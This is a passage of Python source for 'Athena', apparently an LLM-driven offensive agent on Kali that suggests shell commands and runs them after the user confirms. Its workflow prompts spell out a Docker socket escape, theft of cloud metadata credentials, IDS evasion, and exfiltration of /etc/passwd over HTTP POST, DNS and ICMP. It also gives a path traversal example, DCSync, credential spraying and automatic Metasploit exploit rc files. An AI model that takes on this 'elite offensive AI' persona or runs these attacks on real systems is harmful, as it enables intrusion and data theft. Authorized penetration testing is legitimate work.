            "Phase 6: If DA creds: impacket-secretsdump for full DCSync.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "19": {
        "name": "Container & Cloud Escape",
        "description": "docker socket -> cloud metadata -> IAM theft",
        "prompt": (
            "Container and cloud assessment on: {target}.\n"
            "Phase 1: cat /proc/1/cgroup && ls /.dockerenv 2>/dev/null confirm container.\n"
            "Phase 2: ls -la /var/run/docker.sock -- if exists instant escape.\n"
            "Phase 3: docker socket escape: docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host\n"
            "Phase 4: curl -s -m 3 http://169.254.169.254/latest/meta-data/ AWS IMDS.\n"
            "Phase 5: Dump IAM credentials from metadata.\n"
            "Phase 6: kubectl auth can-i --list cluster permissions.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "20": {
        "name": "IDS/IPS Evasion",
        "description": "MAC spoof -> fragment -> decoys -> timing -> source port",
        "prompt": (
            "Evasive recon against: {target}.\n"
            "Phase 1: ip link show then macchanger -r [iface] randomize MAC.\n"
            "Phase 2: nmap -T1 --scan-delay 10s common ports slow scan.\n"
            "Phase 3: nmap -f --mtu 8 fragment packets.\n"
            "Phase 4: nmap -D RND:15 --data-length 25 decoys with padding.\n"
            "Phase 5: nmap --source-port 53 mimic DNS traffic.\n"
            "Phase 6: Compare results to identify what IDS filtered.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "21": {
        "name": "Data Exfiltration",
        "description": "DNS/HTTP/ICMP covert channels -- bypass DLP",
        "prompt": (
            "Covert exfiltration from host toward: {target}.\n"
            "Phase 1: curl -s https://icanhazip.com && ping 8.8.8.8 -c 2 test outbound.\n"
            "Phase 2: Test HTTPS: curl -s https://www.google.com -o /dev/null -w '%{http_code}'\n"
            "Phase 3: HTTP POST exfil: curl -X POST -F 'file=@/etc/passwd' http://{target}/collect\n"
            "Phase 4: DNS exfil: for chunk in $(cat /etc/passwd|base64|fold -w30); do nslookup $chunk.{target}; done\n"
            "Phase 5: ICMP exfil if allowed: ping -p $(xxd -p /etc/passwd|head -c16) {target} -c1\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "22": {
        "name": "Forensics & Evidence Collection",
        "description": "volatility + binwalk + strings -- memory and firmware",
        "prompt": (
            "Forensic analysis on: {target}.\n"
            "Phase 1: sha256sum {target} record integrity hash first.\n"
            "Phase 2: file {target} && strings {target} | head -200.\n"
            "Phase 3: binwalk {target} for embedded files.\n"
            "Phase 4: If memory dump: volatility3 -f {target} windows.info 2>/dev/null || volatility -f {target} imageinfo\n"
            "Phase 5: volatility3 windows.pslist and windows.netstat.\n"
            "Phase 6: binwalk -e {target} extract all embedded content.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
    "23": {
        "name": "Steganography Analysis",
        "description": "steghide + zsteg + exiftool -- find hidden data",
        "prompt": (
            "Steganography analysis on: {target}.\n"
            "Phase 1: file {target} confirm real type.\n"
            "Phase 2: exiftool {target} metadata.\n"
            "Phase 3: strings {target} | grep -iE 'flag|key|pass|secret|htb|thm'\n"
            "Phase 4: steghide extract -sf {target} -p ''\n"
            "Phase 5: zsteg -a {target} for PNG/BMP LSB.\n"
            "Phase 6: binwalk -e {target} extract appended data.\n"
            "Phase 7: xxd {target} | tail -50 inspect raw bytes.\n"
            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
        ),
    },
}


# ─────────────────────────────────────────────────────────────
# SYSTEM PROMPT
# ─────────────────────────────────────────────────────────────

RULES = (
    "FORMAT: [THOUGHT]reasoning[/THOUGHT][CMD]one shell command[/CMD] only.\n"
    "RULES: open ports→searchsploit. user found→spray all services. hash→crack. "
    "creds→test SSH/SMB/FTP/RDP. shell→id/uname/sudo -l first. "
    "never repeat cmds. never apt upgrade. never invent MSF modules. "
    "MSF .rc must end with exit. cite CVSS. reason from real output only. "
    "WORKFLOW_COMPLETE when done. ALWAYS prefer non-interactive cmds (no msfconsole/mysql/ssh interactive)."
)


def build_system_prompt(
    target_info: dict,
    findings: dict,
    lhost: str,
    workflow_key: str = None,
    free_form_prompt: str = ""
) -> str:
    parts = []
    if target_info.get("ip"):
        parts.append(f"Target: {target_info['ip']}")
    if target_info.get("domain"):
        parts.append(f"Domain: {target_info['domain']}")
    if target_info.get("notes"):
        parts.append(f"Notes: {target_info['notes']}")
    target_block = " | ".join(parts) if parts else "No target set"

    actionable = ["user", "hash_ntlm", "hash", "cred", "cve", "port", "ip", "domain", "exposed_path"]
    findings_lines = []
    for key in actionable:
        vals = findings.get(key, [])
        if vals:
            unique = list(dict.fromkeys(vals))[-6:]
            findings_lines.append(f"  {key.upper()}: {', '.join(str(v) for v in unique)}")
    findings_block = ""
    if findings_lines:
        findings_block = "LIVE FINDINGS (pivot from these):\n" + "\n".join(findings_lines) + "\n"

    kb_text = get_kb_sections(workflow_key, free_form_prompt)

    skip_directive = ""
    if findings.get("port"):
        skip_directive += " SKIP port discovery — ports already known. "
    if findings.get("ip"):
        skip_directive += "SKIP host discovery — hosts already known. "
    if findings.get("svc"):
        skip_directive += "SKIP banner grab — services already fingerprinted. "
    if findings.get("user"):
        skip_directive += "USE known users for spray. "
    if findings.get("cred"):
        skip_directive += "TEST creds across all services NOW. "
    if findings.get("hash") or findings.get("hash_ntlm"):
        skip_directive += "QUEUE hashes for cracking. "
    if findings.get("exposed_path"):
        skip_directive += "FETCH exposed paths immediately. "
    if findings.get("cve"):
        skip_directive += "EXPLOIT known CVEs first. "

    if skip_directive:
        skip_directive = f"AUTO-SKIP: {skip_directive.strip()}\n"

    return (
        f"You are Athena, elite offensive AI on Kali. The Priest commands. LHOST {lhost}\n"
        f"{target_block}\n"
        f"{findings_block}{skip_directive}"
        f"{RULES}\n"
        f"KB:\n{kb_text}\n"
        f"EX: [THOUGHT]Apache 2.4.49 CVE-2021-41773 7.5 path traversal[/THOUGHT]"
        f"[CMD]curl -s --path-as-is 'http://t/cgi-bin/.%2F.%2F.%2Fetc/passwd'[/CMD]"
    )


# ─────────────────────────────────────────────────────────────
# UTILITIES
# ─────────────────────────────────────────────────────────────

def get_lhost() -> str:
    try:
        r = subprocess.run(
            "hostname -I | awk '{print $1}'",
            shell=True, capture_output=True, text=True
        )
        ip = r.stdout.strip()
        if ip and ip != "127.0.0.1":
            return ip
    except Exception:
        pass
    return "127.0.0.1"


def ensure_rockyou():
    plain = "/usr/share/wordlists/rockyou.txt"
    gz    = "/usr/share/wordlists/rockyou.txt.gz"
    if os.path.exists(plain):
        return
    if os.path.exists(gz):
        print("\033[33m   Auto-unzipping rockyou.txt.gz...\033[0m")
        subprocess.run(f"sudo gunzip {gz}", shell=True)


def cmd_exists(cmd: str) -> bool:
    try:
        r = subprocess.run(f"which {cmd}", shell=True,
                           capture_output=True, text=True)
        return bool(r.stdout.strip())
    except Exception:
        return False


def get_credential_wordlist() -> list:
    """Load passwords from wordlist file or return fallback list."""
    for wl_path in CRED_WORDLISTS:
        if os.path.exists(wl_path):
            try:
                with open(wl_path) as f:
                    passwords = [line.strip() for line in f if line.strip()]
                    return passwords[:20]  # Top 20 to avoid lockout
            except Exception:
                continue
    return FALLBACK_PASSWORDS


def auto_cve_lookup(output: str) -> str:
    """Enhanced CVE lookup — also searches by CVE number if found."""
    if not cmd_exists("searchsploit"):
        return ""
    
    results = []
    seen = set()
    
    # First: look for explicit CVE numbers
    cve_matches = re.findall(r'CVE-\d{4}-\d+', output, re.IGNORECASE)
    for cve in cve_matches[:3]:
        if cve in seen:
            continue
        seen.add(cve)
        try:
            r = subprocess.run(
                f"searchsploit '{cve}' 2>/dev/null | head -8",
                shell=True, capture_output=True, text=True, timeout=8
            )
            if r.stdout.strip() and "No Results" not in r.stdout:
                results.append(f"\n\033[35m[EXPLOIT: {cve}]\033[0m\n{r.stdout}")
        except Exception:
            pass
    
    # Second: service version fuzzy search
    matches = re.findall(
        r'\d+/tcp\s+open\s+\S+\s+(.+?)(?:\n|$)', output, re.IGNORECASE
    )
    for svc in matches[:3]:
        svc   = svc.strip()
        words = svc.split()
        query = " ".join(words[:2]) if len(words) >= 2 else svc
        if query in seen or len(query) < 3:
            continue
        seen.add(query)
        try:
            r = subprocess.run(
                f"searchsploit '{query}' 2>/dev/null | head -6",
                shell=True, capture_output=True, text=True, timeout=8
            )
            if r.stdout.strip() and "No Results" not in r.stdout:
                results.append(f"\n\033[35m[CVE: {query}]\033[0m\n{r.stdout}")
        except Exception:
            pass
    
    return "".join(results)


def extract_exploit_paths(searchsploit_output: str) -> list:
    """Extract exploit file paths from searchsploit output."""
    exploits = []
    for line in searchsploit_output.split('\n'):
        match = re.search(r'(exploits/[^\s]+)', line)
        if match:
            exploits.append(match.group(1))
    return exploits


SENSITIVE_PATH_PATTERNS = [
    r'\.ssh/',
    r'\.bash_history',
    r'\.bashrc',
    r'\.git/',
    r'\.env',
    r'\.aws/',
    r'wp-config\.php',
    r'config\.php',
    r'/etc/passwd',
    r'/etc/shadow',
    r'id_rsa',
]


def detect_sensitive_paths(output: str) -> list:
    found = []
    for pattern in SENSITIVE_PATH_PATTERNS:
        if re.search(pattern, output):
            found.append(pattern.replace('\\', '').strip('/'))
    return found


def extract_findings(output: str, findings: dict) -> dict:
    """Extract only NEW unique findings, max 5 new per type per output."""
    if len(output) < 50:
        return findings
    for key, pattern in FINDING_PATTERNS.items():
        try:
            matches = re.findall(pattern, output, re.IGNORECASE | re.MULTILINE)
        except Exception:
            continue
        if not matches:
            continue
        flat = []
        seen_local = set()
        for m in matches:
            if isinstance(m, tuple):
                items = [x.strip().rstrip('.,;:') for x in m if x and len(x.strip()) > 2]
            else:
                items = [str(m).strip().rstrip('.,;:')] if m and len(str(m).strip()) > 2 else []
            for it in items:
                if it not in seen_local and it not in IP_NOISE and len(it) > 2:
                    seen_local.add(it)
                    flat.append(it)
        if flat:
            existing = set(findings.get(key, []))
            new_items = [x for x in flat if x not in existing][:5]
            if new_items:
                findings.setdefault(key, []).extend(new_items)
                if len(findings[key]) > 30:
                    findings[key] = findings[key][-30:]
    return findings


def compress_output_for_history(output: str, is_exploit_result: bool = False) -> str:
    """Aggressively compress terminal output UNLESS it's an exploit result."""
    if is_exploit_result:
        # Keep exploit output intact — might contain shell, credentials, etc
        return output[:MAX_OUTPUT_CHARS]
    
    output = re.sub(r'\033\[[0-9;]*m', '', output)
    output = re.sub(r'\x1b\[[0-9;]*m', '', output)
    lines = output.split('\n')
    junk_patterns = [
        r'^Stats: ', r'^SYN Stealth Scan Timing', r'^\s*$',
        r'^Reading database', r'^Preparing to unpack',
        r'^Selecting previously', r'^Unpacking ',
        r'^Setting up ', r'^Processing triggers',
        r'^\(Reading database', r'^Get:\d', r'^Hit:\d',
        r'^Ign:\d', r'^Fetched ', r'^WARNING:.*Cannot open MAC',
        r'^Starting Nmap', r'^Nmap done:', r'^Nmap scan report',
    ]
    junk_re = re.compile('|'.join(junk_patterns))
    cleaned = []
    last = None
    for line in lines:
        line = line.rstrip()
        if junk_re.search(line):
            continue
        if line == last:
            continue
        if len(line) > 200:
            line = line[:200] + "..."
        cleaned.append(line)
        last = line
    result = '\n'.join(cleaned).strip()
    if len(result) > 1500:
        head = result[:600]
        tail = result[-400:]
        result = f"{head}\n[...{len(result)-1000} chars trimmed...]\n{tail}"
    return result or "(no useful output)"


def install_if_missing(tool: str) -> bool:
    if cmd_exists(tool):
        return True
    try:
        print(f"\033[33m   Auto-installing {tool}...\033[0m")
        r = subprocess.run(
            f"sudo apt install -y {tool} 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=60
        )
        return cmd_exists(tool)
    except Exception:
        return False


EXPECTED_TOOLS = [
    "nmap", "arp-scan", "nikto", "gobuster", "whatweb", "searchsploit",
    "hydra", "crackmapexec", "enum4linux", "smbclient", "sqlmap",
    "hashcat", "hashid", "john", "msfvenom", "msfconsole", "curl",
    "dig", "whois", "fierce", "dnsenum", "dnsrecon", "ffuf", "arjun",
    "sslscan", "testssl.sh", "binwalk", "exiftool", "steghide", "zsteg",
    "macchanger", "hcxtools", "aircrack-ng", "wpscan", "responder",
]


def fancy_header(text: str, color: str = "35") -> str:
    width = max(len(text) + 4, 40)
    line = "─" * width
    padded = text.center(width - 2)
    return (
        f"\033[{color}m┌{line}┐\n"
        f"│ {padded} │\n"
        f"└{line}┘\033[0m"
    )


# ─────────────────────────────────────────────────────────────
# NEW: AUTO-EXPLOIT ENGINE
# ─────────────────────────────────────────────────────────────

def analyze_and_suggest_exploit(cve: str, target: str, lhost: str) -> str:
    """
    When CVE found:
    1. Run searchsploit to find exploits
    2. Check if it's a MSF module
    3. Suggest command to run
    """
    if not cmd_exists("searchsploit"):
        return ""
    
    try:
        # Search for exploits
        r = subprocess.run(
            f"searchsploit '{cve}' -j 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=10
        )
        
        if not r.stdout.strip():
            return ""
        
        try:
            data = json.loads(r.stdout)
            results = data.get("RESULTS_EXPLOIT", [])
        except:
            return ""
        
        if not results:
            return ""
        
        # Prioritize metasploit modules
        msf_exploits = [e for e in results if "metasploit" in e.get("Path", "").lower()]
        other_exploits = [e for e in results if "metasploit" not in e.get("Path", "").lower()]
        
        suggestions = []
        
        # MSF modules first
        for exploit in msf_exploits[:2]:
            path = exploit.get("Path", "")
            title = exploit.get("Title", "")
            
            # Extract module path from file path
            # e.g., exploits/linux/remote/12345.rb -> linux/remote/12345
            module_match = re.search(r'exploits/([^/]+/[^/]+)/\d+', path)
            if module_match:
                module_path = f"exploit/{module_match.group(1)}/..."
                suggestions.append({
                    "type": "msf",
                    "title": title,
                    "module": module_path,
                    "cve": cve
                })
        
        # Standalone exploits
        for exploit in other_exploits[:2]:
            path = exploit.get("Path", "")
            title = exploit.get("Title", "")
            
            if path:
                full_path = f"/usr/share/exploitdb/{path}"
                suggestions.append({
                    "type": "standalone",
                    "title": title,
                    "path": full_path,
                    "cve": cve
                })
        
        if not suggestions:
            return ""
        
        # Format output
        output = f"\n\033[31m{'='*60}\033[0m\n"
        output += f"\033[31m⚔️  EXPLOIT AVAILABLE: {cve}\033[0m\n"
        output += f"\033[31m{'='*60}\033[0m\n"
        
        for i, sug in enumerate(suggestions, 1):
            output += f"\n\033[33m[OPTION {i}] {sug['title']}\033[0m\n"
            
            if sug['type'] == 'msf':
                output += f"\033[90mType: Metasploit Module\033[0m\n"
                output += f"\033[97mSuggested command:\033[0m\n"
                output += f"  echo 'use {sug['module']}' > /tmp/exploit.rc\n"
                output += f"  echo 'set RHOSTS {target}' >> /tmp/exploit.rc\n"
                output += f"  echo 'set LHOST {lhost}' >> /tmp/exploit.rc\n"
                output += f"  echo 'run' >> /tmp/exploit.rc\n"
                output += f"  echo 'exit' >> /tmp/exploit.rc\n"
                output += f"  msfconsole -q -r /tmp/exploit.rc\n"
            else:
                output += f"\033[90mType: Standalone Exploit\033[0m\n"
                output += f"\033[97mPath:\033[0m {sug['path']}\n"
                output += f"\033[97mSuggested command:\033[0m\n"
                output += f"  cat {sug['path']}\n"
                output += f"  # Review the exploit, then modify and run as needed\n"
        
        output += f"\n\033[31m{'='*60}\033[0m\n"
        return output
        
    except Exception as e:
        return ""


# ─────────────────────────────────────────────────────────────
# ATHENA SESSION
# ─────────────────────────────────────────────────────────────

class AthenaSession:

    def __init__(self):
        self.history = []
        self.target_info = {}
        self.lhost = "127.0.0.1"
        self.logfile = None
        self.session_start = datetime.datetime.now()
        self.current_workflow_key = None
        self.findings = {
            "ip": [], "port": [], "user": [], "hash_ntlm": [],
            "hash": [], "cred": [], "cve": [], "svc": [], "domain": [],
            "exposed_path": [],
        }
        self.command_history = []
        self.stuck_counter = 0  # FIXED: Now properly tracked
        self.tools_available = {}
        self.remembered = []
        
        # Provider state
        self.provider_index = 0
        self.groq_client = None
        self.cerebras_client = None
        self.cerebras_disabled = False
        self.cerebras_fail_count = 0
        
        os.makedirs(INSTALL_DIR, exist_ok=True)
        os.makedirs(LOG_DIR, exist_ok=True)
        
        self._init_providers()
        self._load_findings()  # NEW: Load persistent findings
        self._start_log()
        self._run_boot_check()
        self.lhost = get_lhost()
        ensure_rockyou()

    # ── Persistent Findings ───────────────────────────────────

    def _load_findings(self):
        """Load findings from JSON file on startup."""
        if os.path.exists(FINDINGS_FILE):
            try:
                with open(FINDINGS_FILE) as f:
                    self.findings = json.load(f)
                    unique_count = sum(len(v) for v in self.findings.values())
                    if unique_count > 0:
                        print(f"\033[32m   Loaded {unique_count} findings from previous session\033[0m")
            except Exception as e:
                print(f"\033[33m   Failed to load findings: {e}\033[0m")

    def _save_findings(self):
        """Save findings to JSON file (called after each command)."""
        try:
            with open(FINDINGS_FILE, "w") as f:
                json.dump(self.findings, f, indent=2)
        except Exception:
            pass  # Silent fail — don't interrupt flow

    # ── Provider Management (with retry fix) ──────────────────

    def _init_providers(self):
        groq_key = os.environ.get("GROQ_API_KEY")
        cerebras_key = os.environ.get("CEREBRAS_API_KEY")
        
        if not groq_key and not cerebras_key:
            print("\n\033[31m   FATAL: No API keys found.\033[0m\n"
                  "   Set GROQ_API_KEY and/or CEREBRAS_API_KEY in ~/.bashrc\n")
            sys.exit(1)
        
        if groq_key:
            try:
                self.groq_client = Groq(api_key=groq_key)
            except Exception as e:
                print(f"\033[33m   Groq init warning: {e}\033[0m")
        
        if cerebras_key and Cerebras:
            try:
                self.cerebras_client = Cerebras(api_key=cerebras_key)
            except Exception as e:
                print(f"\033[33m   Cerebras init warning: {e}\033[0m")
        
        self.provider_index = self._find_first_available()
        p = PROVIDER_CHAIN[self.provider_index]
        print(f"\033[32m   Active model: {p[2]}\033[0m")

    def _find_first_available(self) -> int:
        for i, (provider, model, name) in enumerate(PROVIDER_CHAIN):
            if provider == "cerebras" and self.cerebras_client and not self.cerebras_disabled:
                return i
            if provider == "groq" and self.groq_client:
                return i
        print("\033[31m   FATAL: No working providers found.\033[0m")
        sys.exit(1)

    def _call_provider(self, messages: list, provider: str, model: str) -> str:
        if provider == "cerebras" and self.cerebras_client:
            completion = self.cerebras_client.chat.completions.create(
                model=model,
                messages=messages,
                temperature=0.2,
                max_tokens=1024,
            )
            return completion.choices[0].message.content
        
        elif provider == "groq" and self.groq_client:
            completion = self.groq_client.chat.completions.create(
                model=model,
                messages=messages,
                temperature=0.2,
                max_tokens=1024,
            )
            return completion.choices[0].message.content
        
        raise Exception(f"Provider {provider} not available")

    def _think_with_fallback(self, messages: list) -> str:
        """FIXED: Retries the same request on new provider instead of losing it."""
        start_index = self.provider_index
        last_error = None
        
        for attempt in range(len(PROVIDER_CHAIN)):
            idx = (start_index + attempt) % len(PROVIDER_CHAIN)
            provider, model, name = PROVIDER_CHAIN[idx]
            
            if provider == "cerebras" and (not self.cerebras_client or self.cerebras_disabled):
                continue
            if provider == "groq" and not self.groq_client:
                continue
            
            try:
                response = self._call_provider(messages, provider, model)
                if idx != self.provider_index:
                    self.provider_index = idx
                    print(f"\n\033[33m   Switched to: {name}\033[0m")
                return response
            
            except Exception as e:
                last_error = e
                err_str = str(e).lower()
                is_limit = any(x in err_str for x in [
                    "rate", "limit", "429", "quota", "exceeded",
                    "too many", "queue", "capacity"
                ])
                is_cloudflare = "cloudflare" in err_str or "<!doctype html>" in err_str.lower()
                is_404 = "404" in err_str or "not_found" in err_str or "does not exist" in err_str
                
                if is_404:
                    continue
                elif is_cloudflare:
                    print(f"\n\033[33m   {name} blocked by Cloudflare — trying next...\033[0m")
                    if provider == "cerebras":
                        self.cerebras_fail_count += 1
                        if self.cerebras_fail_count >= 2:
                            self.cerebras_disabled = True
                            print(f"\033[33m   Cerebras disabled for session (2 blocks)\033[0m")
                    continue
                elif is_limit:
                    print(f"\n\033[33m   {name} limit hit — trying next...\033[0m")
                    continue
                else:
                    short_err = err_str[:80]
                    print(f"\n\033[31m   {name} error: {short_err}\033[0m")
                    continue
        
        print(f"\n\033[31m   All providers exhausted. Last error: {last_error}\033[0m")
        return None

    # ── Session Setup ─────────────────────────────────────────

    def _start_log(self):
        ts = self.session_start.strftime("%Y%m%d_%H%M%S")
        log_path = os.path.join(LOG_DIR, f"session_{ts}.txt")
        try:
            self.logfile = open(log_path, "w")
            self.logfile.write(
                f"ATHENA v{VERSION} LOG\nStarted: {self.session_start.isoformat()}\n{'='*60}\n\n"
            )
            self.logfile.flush()
            print(f"\033[90m   Log: {log_path}\033[0m")
        except Exception as e:
            print(f"\033[33m   Log failed: {e}\033[0m")

    def _log(self, text: str):
        if self.logfile:
            try:
                clean = re.sub(r'\033\[[0-9;]*m', '', text)
                self.logfile.write(clean + "\n")
                self.logfile.flush()
            except Exception:
                pass

    def _run_boot_check(self):
        if os.path.exists(BOOT_LOCK):
            return
        print("\n\033[35m   ATHENA:\033[0m Boot check...")
        result = subprocess.run(
            "apt list --upgradable 2>/dev/null",
            shell=True, capture_output=True, text=True
        )
        upgrades = result.stdout.lower()
        threats = [p for p in BANNED_UPGRADE_PACKAGES if p in upgrades]
        if threats:
            print(f"\033[33m   UI THREAT BLOCKED: {', '.join(threats)}\033[0m")
        else:
            print("\033[32m   System OK\033[0m")
        with open(BOOT_LOCK, "w") as f:
            f.write("ok")

    # ── Target ────────────────────────────────────────────────

    def set_target(self):
        print("\n\033[35m   ATHENA:\033[0m Set target. Enter to skip any field.\n")
        ip = input("   IP / CIDR range : ").strip()
        domain = input("   Domain / URL    : ").strip()
        notes = input("   Mission notes   : ").strip()
        self.target_info = {
            "ip": ip or None,
            "domain": domain or None,
            "notes": notes or None,
        }
        if ip or domain:
            summary = " | ".join(filter(None, [ip, domain]))
            print(f"\n\033[32m   Target: {summary}\033[0m")
            self._log(f"[TARGET] {summary} | {notes}")
        else:
            print("\n\033[33m   No target set.\033[0m")

    # ── Command Execution ─────────────────────────────────────

    def _is_banned(self, cmd: str) -> bool:
        return any(b in cmd.lower() for b in BANNED_COMMANDS)

    def _is_interactive(self, cmd: str) -> tuple:
        cmd_lower = cmd.lower().strip()
        non_interactive_markers = [" -q -r ", " -batch ", " --batch", " -e '", " -c '",
                                    "sshpass", "<<EOF", "<<<", " -y ", "expect "]
        if any(m in cmd for m in non_interactive_markers):
            return (False, "")
        for trigger, fix in INTERACTIVE_BLOCKED.items():
            if cmd_lower.startswith(trigger) or f" {trigger}" in cmd_lower or f"&& {trigger}" in cmd_lower or f"; {trigger}" in cmd_lower:
                if trigger == "msfconsole" and (" -q -r " in cmd or " -q -x " in cmd):
                    return (False, "")
                return (True, fix)
        return (False, "")

    def _is_destructive(self, cmd: str) -> bool:
        for pattern in DESTRUCTIVE_COMMANDS:
            if re.search(pattern, cmd):
                return True
        return False

    def _needs_double_confirm(self, cmd: str) -> bool:
        for pattern in DOUBLE_CONFIRM:
            if re.search(pattern, cmd):
                return True
        return False

    def _normalize_choice(self, choice: str) -> str:
        c = choice.strip().lower()
        if c in ("y", "yes", "1y", "yy", "yeah", "yep", "ye"):
            return "y"
        if c in ("n", "no", "skip", "nope"):
            return "n"
        if c in ("q", "quit", "exit", "stop"):
            return "q"
        return c

    def run_command(self, cmd: str) -> str:
        if self._is_destructive(cmd):
            print(f"\n\033[31m   ⛔ DESTRUCTIVE COMMAND REFUSED: {cmd}\033[0m")
            print(f"\033[31m   Athena will NOT run anything that wipes data, kills the system, or creates fork bombs.\033[0m")
            self._log(f"[DESTRUCTIVE REFUSED] {cmd}")
            return "INTERACTIVE_BLOCKED"
        
        is_interactive, fix = self._is_interactive(cmd)
        if is_interactive:
            print(f"\n\033[31m   INTERACTIVE BLOCKED:\033[0m {cmd}")
            print(f"\033[33m   Fix: {fix}\033[0m")
            self._log(f"[INTERACTIVE BLOCKED] {cmd}")
            return "INTERACTIVE_BLOCKED"
        
        print(f"\n\033[35m   ATHENA SUGGESTS:\033[0m\n\033[97m   {cmd}\033[0m\n")
        self._log(f"\n[CMD]\n{cmd}")
        
        try:
            raw_choice = input(
                "\033[90m   Execute? [y] yes  [n] skip  [q] quit: \033[0m"
            )
        except (EOFError, KeyboardInterrupt):
            print()
            return "SESSION_EXIT"
        
        choice = self._normalize_choice(raw_choice)
        
        if choice == "q":
            return "SESSION_EXIT"
        if choice != "y":
            print("\033[90m   Skipped.\033[0m")
            self._log("[SKIPPED]")
            return "COMMAND_REJECTED"
        
        if self._needs_double_confirm(cmd):
            print(f"\n\033[33m   ⚠  This modifies system state. Confirm again.\033[0m")
            try:
                second = input("\033[33m   Really execute? [y/n]: \033[0m")
            except (EOFError, KeyboardInterrupt):
                return "COMMAND_REJECTED"
            if self._normalize_choice(second) != "y":
                print("\033[90m   Cancelled.\033[0m")
                self._log("[DOUBLE CONFIRM CANCELLED]")
                return "COMMAND_REJECTED"
        
        print(f"\n\033[33m   Executing...  [Ctrl+C to abort this command only]\033[0m\n")
        output_lines = []
        proc = None
        is_exploit = any(kw in cmd.lower() for kw in ["exploit", "msfconsole", "searchsploit -m"])
        
        try:
            proc = subprocess.Popen(
                cmd, shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                preexec_fn=os.setsid,
            )
            for line in proc.stdout:
                print(line, end="")
                output_lines.append(line)
            proc.wait()
        except KeyboardInterrupt:
            print("\n\033[33m   Command aborted by user — returning to Athena\033[0m")
            if proc:
                try:
                    import signal
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    proc.wait(timeout=2)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
            output_lines.append("\n[COMMAND ABORTED BY USER]\n")
        except Exception as e:
            err = f"EXECUTION ERROR: {e}"
            print(f"\033[31m{err}\033[0m")
            return err
        
        output = "".join(output_lines)
        
        # CVE lookup + exploit suggestion
        if any(kw in cmd for kw in ["nmap", "whatweb", "smbclient", "nikto", "searchsploit"]):
            cve_extra = auto_cve_lookup(output)
            if cve_extra:
                print(cve_extra)
                output += "\n" + re.sub(r'\033\[[0-9;]*m', '', cve_extra)
        
        # NEW: Auto-exploit suggestion when CVE found
        cve_matches = re.findall(r'CVE-\d{4}-\d+', output, re.IGNORECASE)
        if cve_matches:
            target = self.target_info.get("ip") or self.target_info.get("domain") or "TARGET"
            for cve in cve_matches[:2]:  # Limit to 2 to avoid spam
                exploit_suggestion = analyze_and_suggest_exploit(cve, target, self.lhost)
                if exploit_suggestion:
                    print(exploit_suggestion)
                    output += "\n" + re.sub(r'\033\[[0-9;]*m', '', exploit_suggestion)
        
        # Detect exposed sensitive paths
        sensitive = detect_sensitive_paths(output)
        if sensitive:
            existing = set(self.findings.get("exposed_path", []))
            new_paths = [p for p in sensitive if p not in existing]
            if new_paths:
                self.findings.setdefault("exposed_path", []).extend(new_paths)
                print(f"\n\033[31m   ⚠️  EXPOSED PATHS DETECTED: {', '.join(new_paths)}\033[0m")
        
        self.findings = extract_findings(output, self.findings)
        self._save_findings()  # NEW: Persist findings after each command
        
        compressed = compress_output_for_history(output, is_exploit_result=is_exploit)
        
        self._log(f"[OUTPUT]\n{output}")
        
        if len(output) > 1000 and len(compressed) < len(output) * 0.5:
            print(f"\033[90m   [output compressed: {len(output)}→{len(compressed)} chars for AI]\033[0m")
        
        return compressed.strip() or "(no output)"

    # ── AI Core ───────────────────────────────────────────────

    def think(self, prompt: str, workflow_key: str = None):
        system_prompt = build_system_prompt(
            self.target_info,
            self.findings,
            self.lhost,
            workflow_key=workflow_key,
            free_form_prompt=prompt if not workflow_key else ""
        )
        windowed = self.history[-MAX_HISTORY_MESSAGES:]
        compressed = []
        for msg in windowed:
            if msg["role"] == "assistant":
                cmd_match = re.search(r'\[CMD\](.*?)\[/?CMD\]', msg["content"], re.DOTALL)
                if cmd_match:
                    compressed.append({
                        "role": "assistant",
                        "content": f"[CMD]{cmd_match.group(1).strip()}[/CMD]"
                    })
                else:
                    compressed.append(msg)
            else:
                compressed.append(msg)
        
        messages = [{"role": "system", "content": system_prompt}]
        messages.extend(compressed)
        messages.append({"role": "user", "content": prompt})
        
        response = self._think_with_fallback(messages)
        if not response:
            return None, None
        
        self.history.append({"role": "user", "content": prompt})
        self.history.append({"role": "assistant", "content": response})
        self._log(f"[AI]\n{response}")
        
        thought_match = re.search(
            r'\[THOUGHT\](.*?)\[/?THOUGHT\]',
            response, re.DOTALL | re.IGNORECASE
        )
        thought = (
            thought_match.group(1).strip()
            if thought_match else "[No reasoning block]"
        )
        print(f"\n\033[90m   THINKING:\n   {thought}\033[0m")
        
        cmd_match = re.search(
            r'\[CMD\](.*?)\[/?CMD\]',
            response, re.DOTALL | re.IGNORECASE
        )
        if not cmd_match:
            print("\n\033[33m   No [CMD] found. Try rephrasing.\033[0m")
            return thought, None
        
        return thought, cmd_match.group(1).strip()

    # ── Agent Loop (with stuck recovery FIXED) ────────────────

    def _agent_loop(self, initial_prompt: str, workflow_key: str = None):
        prompt = initial_prompt
        self.current_workflow_key = workflow_key
        self.stuck_counter = 0  # Reset at start of new loop
        
        while True:
            thought, cmd = self.think(prompt, workflow_key=workflow_key)
            if cmd is None:
                break
            
            if self._is_banned(cmd):
                print("\n\033[31m   Banned upgrade command blocked.\033[0m")
                prompt = (
                    "That apt upgrade variant is blocked. "
                    "Use which or dpkg -l to check tools. "
                    "Alternative with [THOUGHT] and [CMD]."
                )
                continue
            
            if WORKFLOW_DONE in cmd.upper():
                print("\n\033[32m   Workflow complete.\033[0m\n")
                self._log("[DONE]")
                break
            
            cmd_normalized = re.sub(r'\s+', ' ', cmd.strip().lower())
            if cmd_normalized in self.command_history[-3:]:
                print(f"\n\033[33m   ⚠️  Repeated command detected — telling AI to pivot\033[0m")
                self.stuck_counter += 1
                if self.stuck_counter >= 3:
                    self.stuck_counter = 0
                    self._handle_stuck()
                    break
                prompt = (
                    f"You already ran '{cmd}' recently. "
